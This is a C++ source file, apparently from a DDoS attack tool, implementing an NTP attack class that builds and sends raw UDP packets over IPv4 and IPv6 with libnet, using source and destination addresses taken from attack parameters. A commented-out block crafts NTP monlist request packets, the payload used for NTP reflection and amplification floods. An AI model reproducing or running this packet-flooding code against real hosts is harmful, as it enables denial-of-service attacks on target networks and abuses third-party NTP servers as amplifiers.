
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>

#include "xtool.h"
#include "pktbuild.h"
#include "CDDoSParams.h"
#include "CAttack.h"
#include "CUdpAtk.h"
#include "CNtpAtk.h"

bool CNtpAtk::check_params(){
    /*
 	if (m_params.m_ntp_monlist && m_params.m_payload_data == NULL){
	    NTPMonListPacket ntppkt;
        memset(&ntppkt, 0, sizeof(ntppkt)); 	   
		ntppkt.flag = 0x27;
		ntppkt.auth = 0;
		ntppkt.implement = 0x03;
		ntppkt.code = 0x2a;
		m_params.m_payload_len = sizeof(ntppkt);
		util_memcpy(m_params.m_payload_data, (char*)&ntppkt, sizeof(ntppkt));
    }else if(m_params.m_ntp_monlist ==  false && m_params.m_payload_data == NULL){
		NTPPacket ntppkt;
		memset(&ntppkt, 0, sizeof(ntppkt)); 	
        ntppkt.li_vn_mode = 0x1b;         //0|(3<<2)|(3<<5);
        ntppkt.trantimestamp = time(NULL);
        ntppkt.trantimestamp = htonll(ntppkt.trantimestamp);
        m_params.m_payload_len = sizeof(ntppkt);	
		util_memcpy(m_params.m_payload_data, (char*)&ntppkt, sizeof(ntppkt));
	}*/
	
	return true;

}


int32_t CNtpAtk::attack_one_pkt(int thrd_index)
{
	pdu_l3_desc_t layer3= get_layer3_info();

    if(m_params.m_ip_type==IP_V4){
	    int pkt_len = 0;

	    pkt_len = modify_udp(&layer3, m_pkt_buf[thrd_index], ATTACK_BUF_LEN,  NULL);

		sendpkt( layer3.dstaddr,  layer3.dport,  pkt_len,  thrd_index);
    }else{


		int c = 0;
		
	    
		libnet_build_udp(
			layer3.sport,
			layer3.dport,
			LIBNET_UDP_H +m_params.m_payload_len,
			0,
			(uint8_t*)m_params.m_payload_data, 
			m_params.m_payload_len,
			m_libnet,
			0);
		
		libnet_build_ipv6(
			0,
			0,
			LIBNET_UDP_H +LIBNET_UDP_DNSV4_H+  layer3.payload_len,
			IPPROTO_UDP,
			64, //hop limit
            layer3.srcaddr6,
            layer3.dstaddr6,
			NULL,/*payload*/
			0,/*paylen*/
			m_libnet,
			0);
	
		char srcname[255]={0};
		libnet_addr2name6_r(layer3.srcaddr6,1,srcname,255);
		char dstname[255]={0};
		libnet_addr2name6_r(layer3.dstaddr6,1,dstname,255);
		RC_LOG_INFO("%15s/%5d -> %15s/%5d\n", srcname,layer3.sport,dstname,layer3.dport);
		
		c = libnet_write(m_libnet);
		if (c == -1)
		{
			RC_LOG_INFO( "libnet_write: %s\n", libnet_geterror(m_libnet));
		}
		libnet_clear_packet(m_libnet);

    }

    return RC_OK;
}
